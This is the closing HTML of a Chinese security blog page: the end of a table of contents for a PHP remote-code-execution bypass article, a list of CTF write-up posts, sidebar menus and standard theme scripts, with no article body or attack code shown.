class="toc-number">1.6.3.2.</span> <span class="toc-text">法2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%AD%97%E7%AC%A6%E4%B8%8B%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.6.4.</span> <span class="toc-text">4字符下可控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%951-2"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%952-2"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">法2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AD%97%E7%AC%A6%E4%B8%8B%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.6.5.</span> <span class="toc-text">3字符下可控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.7.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951-3"><span class="toc-number">1.7.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952-3"><span class="toc-number">1.7.2.</span> <span class="toc-text">法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%953-1"><span class="toc-number">1.7.3.</span> <span class="toc-text">法3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%954"><span class="toc-number">1.7.4.</span> <span class="toc-text">法4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.8.</span> <span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.1.</span> <span class="toc-text">核心代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.8.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%951-4"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%952-4"><span class="toc-number">1.8.2.2.</span> <span class="toc-text">法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%953-2"><span class="toc-number">1.8.2.3.</span> <span class="toc-text">法3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%954-1"><span class="toc-number">1.8.2.4.</span> <span class="toc-text">法4</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#localeconv"><span class="toc-number">1.8.2.4.1.</span> <span class="toc-text">localeconv()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#scandir"><span class="toc-number">1.8.2.4.2.</span> <span class="toc-text">scandir()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#current-pos"><span class="toc-number">1.8.2.4.3.</span> <span class="toc-text">current(pos)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dirname-%E5%92%8Cchdir"><span class="toc-number">1.8.2.4.4.</span> <span class="toc-text">dirname()和chdir()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#array-reverse"><span class="toc-number">1.8.2.4.5.</span> <span class="toc-text">array_reverse()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#highlight-file"><span class="toc-number">1.8.2.4.6.</span> <span class="toc-text">highlight_file()</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a><time datetime="2024-05-15T11:45:09.000Z" title="发表于 2024-05-15 19:45:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp">2023-蓝桥杯-wp</a><time datetime="2024-05-15T02:39:09.000Z" title="发表于 2024-05-15 10:39:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp">2023-第一届“帕鲁杯”CTF-wp</a><time datetime="2024-05-15T02:36:58.000Z" title="发表于 2024-05-15 10:36:58">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp">2023-XYCTF-wp</a><time datetime="2024-05-15T02:31:24.000Z" title="发表于 2024-05-15 10:31:24">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp">2023-NKCTF-wp</a><time datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>